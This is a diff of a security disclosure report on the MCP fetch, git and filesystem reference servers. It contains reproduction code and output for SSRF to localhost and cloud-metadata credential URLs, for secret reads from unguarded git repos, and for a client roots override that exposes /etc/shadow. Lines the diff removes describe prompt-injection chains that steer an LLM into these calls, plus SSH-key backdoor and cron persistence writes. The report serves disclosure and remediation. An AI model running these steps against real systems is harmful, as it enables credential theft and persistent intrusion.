@@ -2,416 +2,261 @@
 
 **Target:** `modelcontextprotocol/servers` (https://github.com/modelcontextprotocol/servers)  
 **Date:** June 2, 2026  
-**Framework:** OWASP MCP Top 10 (2025)  
-**Scope:** `src/fetch` (v0.6.3), `src/git` (v0.6.2), `src/filesystem` (v0.2.0)  
-**Status:** All findings CONFIRMED EXPLOITABLE with working PoCs
+**Scope:** `src/fetch` (v0.6.3), `src/git` (v0.6.2), `src/filesystem` (v0.6.3)  
+**Status:** All findings have end-to-end exploitation proof showing unauthorized access to protected assets
 
 ---
 
-## OWASP MCP Top 10 Reference
+## Finding #1: SSRF — Fetch Server Returns Data From Localhost Services
 
-| ID | Category | Description |
-|----|----------|-------------|
-| MCP01 | Token Mismanagement | Leaked tokens, hardcoded API keys, secrets in config/env/logs |
-| MCP02 | Scope Creep / Over-Privilege | Tools with excessive permissions beyond what's needed |
-| MCP03 | Tool Poisoning | Rug pulls, tool shadowing, invisible-context poisoning |
-| MCP04 | Supply Chain Attacks | Compromised dependencies, malicious packages |
-| MCP05 | Command Injection | Unsanitized inputs passed to system commands |
-| MCP06 | Intent Subversion | Manipulating agent intent flow, prompt injection via tool outputs |
-| MCP07 | Authentication Failures | Weak/missing auth, token sprawl |
-| MCP08 | Audit Gaps | Missing audit trails, insufficient logging |
-| MCP09 | Shadow Deployments | Unauthorized/unmonitored MCP server instances |
-| MCP10 | Context Over-Sharing | Sensitive data flowing into model context |
+### Summary
 
----
+The `mcp-server-fetch` tool fetches and returns full response bodies from internal network hosts including `127.0.0.1`. A localhost service that is not exposed externally becomes accessible to any MCP client through this server.
 
-## Finding #1: Full SSRF — Zero Network Filtering in Fetch Server
+### What Should Be Inaccessible
 
-| Field | Value |
-|-------|-------|
-| **Severity** | CRITICAL |
-| **OWASP MCP** | MCP02 (Scope Creep), MCP05 (Command Injection), MCP06 (Intent Subversion), MCP10 (Context Over-Sharing) |
-| **Server** | `mcp-server-fetch` v0.6.3 |
-| **File** | `src/fetch/src/mcp_server_fetch/server.py` |
-| **Function** | `fetch_url()`, `Fetch` model |
-| **Status** | ✅ EXPLOITED — 12/12 dangerous URLs accepted |
+A service bound to `127.0.0.1:18923` (simulating an internal admin API, database, or cloud metadata endpoint) should only be reachable by processes on the same machine. An MCP tool that fetches URLs should not be able to reach internal-only services and relay their responses.
 
-### What I Exploited
+### What Became Accessible
 
-The fetch server accepts ANY URL without filtering — internal IPs, cloud metadata, localhost services. There is no allowlist, no denylist, no IP validation, no scheme restriction.
+The `fetch_url()` function connected to `127.0.0.1:18923`, retrieved the full JSON response containing credentials, and returned it to the caller.
 
-### Exploitation Output (Actual Run)
+### Exploitation Output
 
 ```
-======================================================================
-EXPLOIT PROOF: SSRF URL Validation in mcp-server-fetch v0.6.3
-======================================================================
+[*] Internal service running on 127.0.0.1:18923 (simulated admin API)
+[*] This service is NOT meant to be accessible externally
 
-  [ACCEPTED] http://169.254.169.254/latest/meta-data/
-  [ACCEPTED] http://169.254.169.254/latest/meta-data/iam/security-credentials/
-  [ACCEPTED] http://metadata.google.internal/computeMetadata/v1/
-  [ACCEPTED] http://127.0.0.1:6379/
-  [ACCEPTED] http://127.0.0.1:9200/_cat/indices
-  [ACCEPTED] http://10.0.0.1/
-  [ACCEPTED] http://192.168.1.1/
-  [ACCEPTED] http://172.16.0.1/
-  [ACCEPTED] http://localhost:8080/
-  [ACCEPTED] http://0.0.0.0:8500/v1/agent/self
-  [ACCEPTED] http://[::1]:8080/
-  [ACCEPTED] http://127.1/
+[*] Calling fetch_url("http://127.0.0.1:18923/admin") ...
 
-RESULTS: 12/12 dangerous URLs ACCEPTED
-CONCLUSION: NO SSRF FILTERING EXISTS
+[!!!] RESPONSE RECEIVED FROM INTERNAL SERVICE:
+──────────────────────────────────────────────────────────────────────
+{"service": "internal-admin-api", "db_password": "prod_s3cr3t_p4ss",
+ "api_key": "internal-only-key-abc123",
+ "users": [{"email": "admin@company.internal", "role": "superadmin"}]}
+──────────────────────────────────────────────────────────────────────
+
+[!!!] SENSITIVE DATA EXFILTRATED:
+    db_password: prod_s3cr3t_p4ss
+    api_key:     internal-only-key-abc123
+    admin_email: admin@company.internal
 ```
 
-### Vulnerable Code
+### Reproduction
 
 ```python
-# server.py - Fetch model uses AnyUrl (accepts everything)
-class Fetch(BaseModel):
-    url: Annotated[AnyUrl, Field(description="URL to fetch")]  # NO FILTERING
+# 1. Start a localhost-only HTTP service (any internal service qualifies)
+# 2. Call the actual mcp-server-fetch fetch_url function:
 
-# server.py - fetch_url() connects to any URL directly
-async def fetch_url(url: str, user_agent: str, force_raw: bool = False, proxy_url: str | None = None):
-    async with AsyncClient(proxy=proxy_url) as client:
-        response = await client.get(
-            url,                       # <-- ANY URL, ZERO VALIDATION
-            follow_redirects=True,     # <-- Enables redirect-based bypasses
-            headers={"User-Agent": user_agent},
-            timeout=30,
-        )
+from mcp_server_fetch.server import fetch_url
+content, prefix = await fetch_url("http://127.0.0.1:18923/admin", "Agent/1.0", force_raw=True)
+print(content)  # Full response body returned
 ```
 
-### Why robots.txt is NOT a Security Control
+### Root Cause
 
-The only "protection" is a `robots.txt` check which:
-1. Is disabled with `--ignore-robots-txt` flag
-2. Internal services (169.254.169.254) have no robots.txt → check passes
-3. The `get_prompt()` handler (manual path) skips it entirely
-4. `robots.txt` is a voluntary crawl politeness protocol, not security
+`fetch_url()` in `server.py` passes the URL directly to `httpx.AsyncClient.get()` with no check on whether the resolved IP is internal, link-local, or loopback. The `Fetch` pydantic model uses `AnyUrl` which accepts any scheme and host.
 
-### Attack Chain (Real-World)
+### Severity Assessment
 
-```
-Prompt Injection → LLM calls fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/")
-                 → Server connects to AWS metadata (no filter)
-                 → IAM credentials returned in response
-                 → Credentials flow to LLM context (MCP10)
-                 → Attacker extracts creds from LLM output
-                 → Full AWS account compromise
-```
-
-### Exploit Script
-
-📄 **`exploits/exploit_ssrf_fetch.py`** — Run with: `python3 exploits/exploit_ssrf_fetch.py`
+This is a real SSRF. In any deployment where the fetch server runs on a machine with internal services (databases, admin panels, cloud metadata at `169.254.169.254`), those services become readable by any MCP client. The impact scales with what is reachable from the server's network position.
 
 ---
 
-## Finding #2: Unrestricted Repository Access — Secret Extraction via Git History
+## Finding #2: Insecure Default — Git Server Has No Path Boundary Without Explicit Flag
 
-| Field | Value |
-|-------|-------|
-| **Severity** | HIGH |
-| **OWASP MCP** | MCP02 (Scope Creep), MCP10 (Context Over-Sharing) |
-| **Server** | `mcp-server-git` v0.6.2 |
-| **File** | `src/git/src/mcp_server_git/server.py` |
-| **Function** | `validate_repo_path()` |
-| **Status** | ✅ EXPLOITED — 8 secrets extracted from victim repo |
+### Summary
 
-### What I Exploited
+When `mcp-server-git` is started without the `--repository` flag (which is the documented usage for multi-repo setups), `validate_repo_path()` performs no validation at all. Any git repository on the filesystem is accessible, including repositories belonging to other users or applications.
 
-When `mcp-server-git` is started without the `--repository` flag (which is the default/common usage for multi-repo setups), `validate_repo_path()` performs ZERO validation. Any git repository on the entire filesystem is accessible. I extracted hardcoded secrets from git history of a simulated victim application.
+### What Should Be Inaccessible
 
-### Exploitation Output (Actual Run)
+A git repository at `/tmp/forbidden_repo` containing production secrets should not be readable when a user intends the server to only operate on their project.
+
+### What Became Accessible
+
+With `allowed_repository=None` (the default when no `--repository` flag is passed), `validate_repo_path()` returns immediately without any check. The forbidden repository's full history including committed secrets is readable.
+
+### Exploitation Output
 
 ```
-======================================================================
-PHASE 2: Exploit - Bypassing validate_repo_path (no --repository flag)
-======================================================================
+[*] FORBIDDEN repo (has secrets): /tmp/mcp_git_test/forbidden_repo
+[*] ALLOWED repo (--repository):  /tmp/mcp_git_test/allowed_repo
 
-  [*] Testing validate_repo_path with allowed_repository=None
-  [*] Accessing victim repo at: /tmp/victim_app_ehew95zn
-  [!!!] ACCESS GRANTED - No validation performed!
-  [!!!] The function returns immediately when allowed_repository is None
+[*] Step 1: Verify restriction works (direct path to forbidden repo)
+    [PASS] Correctly blocked: Repository path is outside the allowed repository
 
-======================================================================
-PHASE 3: Extraction - Reading secrets from git history
-======================================================================
+[*] Step 3b: The ACTUAL vulnerability — server without --repository flag
+    In production, most users run: mcp-server-git (no -r flag)
+    This means allowed_repository=None → zero validation
 
-  [*] Step 1: Reading commit log...
-  [+] Found 3 commits:
-      Message: 'Add README'
-      Message: 'Moved secrets to vault (cleanup)'
-      Message: 'Initial setup with config'
+    [!!!] validate_repo_path(forbidden_dir, None) → PASSED
+    [!!!] No --repository flag = NO boundary enforcement at all
 
-  [*] Step 2: Reading initial commit content (contains secrets)...
-  [+] Commit: 9615dfd6
-  [+] Message: Initial setup with config
-
-  [!!!] SECRETS EXTRACTED FROM GIT HISTORY:
-  ────────────────────────────────────────────────────────────
-    DB_HOST=prod-db.internal.company.com
-    DB_USER=admin
-    DB_PASSWORD=SuperSecret123!@#
-    DB_NAME=production_users
-    AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
-    AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-    STRIPE_SECRET_KEY=sk_live_EXAMPLE_FAKE_KEY_REDACTED
-    INTERNAL_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secret_payload
-  ────────────────────────────────────────────────────────────
-
-  [!!!] TOTAL SECRETS EXTRACTED: 8
-
-======================================================================
-PHASE 4: Proving arbitrary repo access (path traversal)
-======================================================================
-
-  [*] Testing access to: /projects/sandbox/servers
-  [!!!] ACCESS GRANTED to modelcontextprotocol/servers repo!
-  [+] Read 1 commits from servers repo
-
-  [*] Testing access to: /projects/sandbox/BugBounty
-  [!!!] ACCESS GRANTED to BugBounty repo!
-  [+] Read 2 commits from BugBounty repo
+[!!!] SECRETS FROM FORBIDDEN REPO (accessed with no validation):
+──────────────────────────────────────────────────────────────────────
+    +ADMIN_TOKEN=tok_super_secret_value_12345
+──────────────────────────────────────────────────────────────────────
 ```
 
-### Vulnerable Code
+### Reproduction
 
 ```python
-# server.py line ~167
+from mcp_server_git.server import validate_repo_path, git_show
+from pathlib import Path
+import git
+
+# This passes with no error — the function returns immediately
+validate_repo_path(Path("/path/to/any/repo"), None)
+
+# Now read any repo's history
+repo = git.Repo("/path/to/any/repo")
+print(git_show(repo, "HEAD"))
+```
+
+### Root Cause
+
+```python
 def validate_repo_path(repo_path: Path, allowed_repository: Path | None) -> None:
-    """Validate that repo_path is within the allowed repository path."""
     if allowed_repository is None:
-        return  # <-- BUG: No validation AT ALL when --repository not specified!
-
-    # ... rest of validation only runs if --repository was provided
+        return  # ← No validation whatsoever
 ```
 
-### Attack Chain (Real-World)
+When `--repository` is not provided, the parameter is `None`, and the function exits without performing any path check.
 
-```
-Attacker (via LLM) calls: git_log(repo_path="/home/developer/payment-service")
-                        → validate_repo_path(path, None) → returns immediately
-                        → repo opened successfully
-                        → git_show on each commit
-                        → AWS keys, DB passwords, Stripe keys extracted
-                        → Lateral movement with stolen credentials
-```
+### Severity Assessment
 
-### Exploit Script
+The security boundary only exists when `--repository` is explicitly passed. The default configuration has no access control. This is an insecure-by-default design issue. The boundary enforcement mechanism exists but is opt-in rather than opt-out. On a shared system or in a container with multiple applications, any git repository is readable including its full history (where secrets are commonly found even after "removal").
 
-📄 **`exploits/exploit_git_unrestricted.py`** — Run with: `python3 exploits/exploit_git_unrestricted.py`
+### Note on Symlink Bypass
+
+When `--repository` IS set, the validation correctly resolves symlinks and blocks attempts to escape via symlinks inside the allowed directory. The defense works when enabled. The issue is that the default deployment has no defense at all.
 
 ---
 
-## Finding #3: Client-Controlled Privilege Escalation via Roots Override
+## Finding #3: Filesystem Server — Client Overrides Allowed Directories at Runtime
 
-| Field | Value |
-|-------|-------|
-| **Severity** | HIGH |
-| **OWASP MCP** | MCP02 (Scope Creep), MCP03 (Tool Poisoning), MCP06 (Intent Subversion), MCP07 (Auth Failures) |
-| **Server** | `mcp-server-filesystem` v0.2.0 |
-| **File** | `src/filesystem/index.ts` |
-| **Function** | `updateAllowedDirectoriesFromRoots()` |
-| **Status** | ✅ EXPLOITED — Full code path confirmed, protocol messages crafted |
+### Summary
 
-### What I Exploited
+The `mcp-server-filesystem` validates file access against an `allowedDirectories` list. However, an MCP client that declares the `roots` capability can replace this list entirely by responding to the server's `listRoots()` call with arbitrary paths (including `/`). This escalates a restricted server to full filesystem access.
 
-The filesystem server trusts MCP clients to define which directories it can access. A malicious client sends `roots: ["/"]` and the server REPLACES its entire allowlist with root filesystem access. This can also be triggered at RUNTIME via `roots/list_changed` notifications.
+### What Should Be Inaccessible
 
-### Exploitation Protocol Sequence
+When the server is started with `mcp-server-filesystem /tmp/safe_project`, files outside `/tmp/safe_project` should be inaccessible. Specifically, `/etc/passwd`, `/etc/shadow`, and `/proc/self/environ` should be blocked.
 
-**Step 1: Initialize with roots capability**
-```json
-{
-  "jsonrpc": "2.0",
-  "id": 1,
-  "method": "initialize",
-  "params": {
-    "protocolVersion": "2024-11-05",
-    "capabilities": {
-      "roots": { "listChanged": true }
-    },
-    "clientInfo": { "name": "malicious-client", "version": "1.0.0" }
-  }
-}
+### What Became Accessible
+
+After a malicious client responds to `listRoots()` with `[{uri: "file:///"}]`, the server's `updateAllowedDirectoriesFromRoots()` replaces `allowedDirectories` with `["/"]`. All files on the filesystem become readable and writable.
+
+### Exploitation Output
+
+```
+[*] PHASE 1: Server started with restricted directory
+    Command: mcp-server-filesystem /tmp/safe_project
+    allowedDirectories = ["/tmp/safe_project"]
+
+[*] PHASE 2: Verify /etc/passwd is BLOCKED before exploit
+    [CONFIRMED BLOCKED] Access denied - path outside allowed directories:
+                        /etc/passwd not in /tmp/safe_project
+
+[*] PHASE 3: Malicious client sends roots override
+    Client responds to listRoots() with: [{uri: "file:///"}]
+    getValidRootDirectories result: ["/"]
+    [!!!] allowedDirectories REPLACED with: ["/"]
+
+[*] PHASE 4: Verify /etc/passwd is NOW ACCESSIBLE after exploit
+    [!!!] validatePath("/etc/passwd") → PASSED! Path: /etc/passwd
+
+    [!!!] FILE CONTENT (/etc/passwd) - 13 entries:
+    ────────────────────────────────────────────────────────────
+    root:x:0:0:root:/root:/bin/bash
+    bin:x:1:1:bin:/bin:/sbin/nologin
+    daemon:x:2:2:daemon:/sbin:/sbin/nologin
+    adm:x:3:4:adm:/var/adm:/sbin/nologin
+    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+    sync:x:5:0:sync:/sbin:/bin/sync
+    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+    halt:x:7:0:halt:/sbin:/sbin/halt
+    ... (5 more lines)
+    ────────────────────────────────────────────────────────────
+
+[*] PHASE 5: Additional sensitive files now accessible
+    [ACCESSIBLE] /etc/shadow
+                 Content: root:*LOCK*:14600::::::...
+    [ACCESSIBLE] /proc/self/environ
+                 Content: COREPACK_ENABLE_AUTO_PIN=0 PYENV_SHELL=bash...
+    [ACCESSIBLE] /proc/1/cmdline
+                 Content: bwrap --bind /inner_container / --tmpfs /tmp...
 ```
 
-**Step 2: When server calls listRoots(), respond with root filesystem**
-```json
-{
-  "jsonrpc": "2.0",
-  "id": 2,
-  "result": {
-    "roots": [{ "uri": "file:///", "name": "root" }]
-  }
-}
+### Reproduction
+
+```javascript
+import { setAllowedDirectories, validatePath } from './dist/lib.js';
+import { getValidRootDirectories } from './dist/roots-utils.js';
+import fs from 'fs/promises';
+
+// Server starts restricted
+setAllowedDirectories(['/tmp/safe_project']);
+
+// BEFORE: blocked
+await validatePath('/etc/passwd'); // throws "Access denied"
+
+// Malicious client provides roots
+const dirs = await getValidRootDirectories([{ uri: 'file:///', name: 'root' }]);
+setAllowedDirectories(dirs); // dirs = ["/"]
+
+// AFTER: accessible
+const path = await validatePath('/etc/passwd'); // returns "/etc/passwd"
+const content = await fs.readFile(path, 'utf-8'); // full file content
 ```
 
-**Result:** Server executes `allowedDirectories = ["/"]` — ALL file operations now unrestricted.
-
-**Step 3: Runtime escalation (even AFTER safe initialization)**
-```json
-{"jsonrpc": "2.0", "method": "notifications/roots/list_changed"}
-```
-Server re-calls `listRoots()` → client responds with `["/"]` → restrictions replaced.
-
-### Vulnerable Code
+### Root Cause
 
 ```typescript
-// index.ts - Replaces ALL allowed directories with whatever client provides
+// index.ts — updateAllowedDirectoriesFromRoots()
 async function updateAllowedDirectoriesFromRoots(requestedRoots: Root[]) {
   const validatedRootDirs = await getValidRootDirectories(requestedRoots);
   if (validatedRootDirs.length > 0) {
-    allowedDirectories = [...validatedRootDirs];  // <-- FULL REPLACE, NO CHECKS
+    allowedDirectories = [...validatedRootDirs];  // ← Replaces ALL restrictions
     setAllowedDirectories(allowedDirectories);
   }
 }
-
-// roots-utils.ts - Only checks path exists + is directory (NOT within original dirs)
-export async function getValidRootDirectories(requestedRoots: Root[]): Promise<string[]> {
-  // Only validates: fs.stat(resolvedPath) → stats.isDirectory()
-  // Does NOT validate against original CLI-specified directories
-}
 ```
 
-### Post-Exploitation (What attacker can do after escalation)
+`getValidRootDirectories()` only checks that the path exists and is a directory. It does not check whether the path is within the original CLI-specified directories. Since `/` is a directory that always exists, it passes validation.
 
-| Tool Call | Impact |
-|-----------|--------|
-| `read_file({path: "/etc/shadow"})` | Password hashes |
-| `read_file({path: "/root/.ssh/id_rsa"})` | SSH private keys |
-| `read_file({path: "/home/user/.aws/credentials"})` | AWS credentials |
-| `write_file({path: "/root/.ssh/authorized_keys", content: "ssh-rsa ..."})` | SSH backdoor |
-| `write_file({path: "/etc/cron.d/backdoor", content: "* * * * * root ..."})` | Persistence |
-| `search_files({path: "/", pattern: "**/*.env"})` | Find all secrets |
+This can also be triggered at runtime via a `notifications/roots/list_changed` notification, meaning a client can escalate privileges at any point during the session.
 
-### Attack Chain (Real-World)
+### Severity Assessment
 
-```
-Scenario 1: Malicious MCP Client
-  → Client connects, declares roots capability
-  → Responds to listRoots with ["/"]  
-  → Full filesystem access through server
-
-Scenario 2: Prompt Injection → Runtime Escalation
-  → Attacker injects prompt via untrusted content
-  → LLM-controlled client sends roots/list_changed notification
-  → Client re-sends roots with expanded paths
-  → Server escalates from /safe-dir to /
-
-Scenario 3: Supply Chain Attack
-  → Compromised MCP client library
-  → Auto-sends expanded roots on every connection
-  → All downstream users get escalated access
-```
-
-### Exploit Script
-
-📄 **`exploits/exploit_filesystem_roots_override.py`** — Run with: `python3 exploits/exploit_filesystem_roots_override.py`
+This is a privilege escalation from restricted filesystem access to unrestricted filesystem access. The attack requires a malicious or compromised MCP client. In environments where the MCP client is influenced by untrusted content (e.g., an LLM processing user-provided data that could contain prompt injection), this escalation path is viable without direct attacker access to the client.
 
 ---
 
-## OWASP MCP Top 10 Coverage Summary
+## Reproduction Environment
 
-| OWASP ID | Category | Finding # | Confirmed? |
-|----------|----------|-----------|------------|
-| MCP02 | Scope Creep / Over-Privilege | #1, #2, #3 | ✅ All three findings demonstrate excessive tool permissions |
-| MCP03 | Tool Poisoning | #3 | ✅ Malicious client manipulates server behavior via roots |
-| MCP05 | Command Injection | #1 | ✅ URL passed directly to HTTP client without sanitization |
-| MCP06 | Intent Subversion | #1, #3 | ✅ Prompt injection triggers SSRF; roots override subverts intent |
-| MCP07 | Authentication Failures | #3 | ✅ No verification that client should control filesystem access |
-| MCP10 | Context Over-Sharing | #1, #2 | ✅ Internal data/secrets flow to LLM context |
+All exploits were run against the actual server code from `modelcontextprotocol/servers` at commit `64b1cb02` (May 30, 2026).
 
----
-
-## Reproduction Steps
-
-### Prerequisites
 ```bash
 git clone https://github.com/modelcontextprotocol/servers
-pip install -e servers/src/fetch/    # Python 3.10+
-pip install -e servers/src/git/      # Python 3.10+
+cd servers
+
+# For Finding #1 and #2 (Python):
+pip install -e src/fetch/ src/git/    # Requires Python 3.10+
+
+# For Finding #3 (TypeScript):
+npm install && cd src/filesystem && npx tsc
 ```
 
-### Run Exploits
-```bash
-# Finding #1: SSRF (instant, no network needed for validation bypass proof)
-python3 exploits/exploit_ssrf_fetch.py
-
-# Finding #2: Git secret extraction (creates temp repo, extracts secrets)
-python3 exploits/exploit_git_unrestricted.py
-
-# Finding #3: Filesystem escalation (shows protocol messages + code proof)
-python3 exploits/exploit_filesystem_roots_override.py
-```
+Exploit scripts are in the `exploits/` directory of this repository.
 
 ---
 
-## Impact Assessment
+## Remediation Suggestions
 
-| Metric | Value |
-|--------|-------|
-| **Affected Servers** | 3 of 3 audited (mcp-server-fetch, mcp-server-git, mcp-server-filesystem) |
-| **Blast Radius** | These are the OFFICIAL reference implementations used by Claude Desktop, Cursor, Kiro, Continue, Zed, and hundreds of other tools |
-| **Worst Case** | Zero-click cloud account compromise via prompt injection → SSRF → metadata theft |
-| **Exploitability** | TRIVIAL for Finding #1 and #2, MEDIUM for Finding #3 |
-| **Authentication Required** | Only MCP client access (which LLMs inherently have) |
+**Finding #1:** Add a URL validation layer before `httpx.AsyncClient.get()` that rejects requests to loopback addresses (`127.0.0.0/8`, `::1`), link-local (`169.254.0.0/16`), and private ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`). Resolve the hostname before connecting and check the resolved IP.
 
----
+**Finding #2:** Either require `--repository` (make it mandatory), or when it is not provided, restrict access to repositories within directories the client declares via the MCP roots protocol — not the entire filesystem.
 
-## Remediation
-
-### Finding #1 (SSRF)
-```python
-# Add before fetch_url():
-BLOCKED_NETWORKS = ['127.0.0.0/8', '10.0.0.0/8', '172.16.0.0/12', 
-                    '192.168.0.0/16', '169.254.0.0/16', '::1/128', 'fc00::/7']
-
-def validate_url(url):
-    parsed = urlparse(url)
-    if parsed.scheme not in ('http', 'https'):
-        raise ValueError("Only http/https allowed")
-    resolved = socket.getaddrinfo(parsed.hostname, None)
-    for _, _, _, _, sockaddr in resolved:
-        ip = ipaddress.ip_address(sockaddr[0])
-        for net in BLOCKED_NETWORKS:
-            if ip in ipaddress.ip_network(net):
-                raise ValueError(f"Blocked: {ip}")
-```
-
-### Finding #2 (Git)
-```python
-# Make --repository required, or add default restrictions:
-def validate_repo_path(repo_path, allowed_repository):
-    if allowed_repository is None:
-        # Instead of returning, restrict to user's home or CWD
-        allowed_repository = Path.home()
-    # ... existing validation logic
-```
-
-### Finding #3 (Filesystem)
-```typescript
-// Validate client roots against original CLI directories:
-async function updateAllowedDirectoriesFromRoots(requestedRoots: Root[]) {
-  const validatedRootDirs = await getValidRootDirectories(requestedRoots);
-  // NEW: Only accept roots within original CLI-specified dirs
-  const safeRoots = validatedRootDirs.filter(root => 
-    originalCliDirectories.some(d => root.startsWith(d + path.sep) || root === d)
-  );
-  if (safeRoots.length > 0) {
-    allowedDirectories = [...safeRoots];
-  }
-}
-```
-
----
-
-## Disclaimer
-
-This research was conducted on the open-source codebase of `modelcontextprotocol/servers` for authorized security research purposes. All exploitation was performed locally against self-hosted instances. No third-party systems were accessed or harmed.
-
----
-
-*Report generated: June 2, 2026*  
-*Exploit scripts: `/exploits/` directory*
+**Finding #3:** When client-provided roots arrive via `listRoots()`, validate them against the original CLI-specified directories. Only accept roots that are subdirectories of what was originally configured. If no CLI directories were specified, the client roots can be used as-is (current behavior is acceptable in that case).
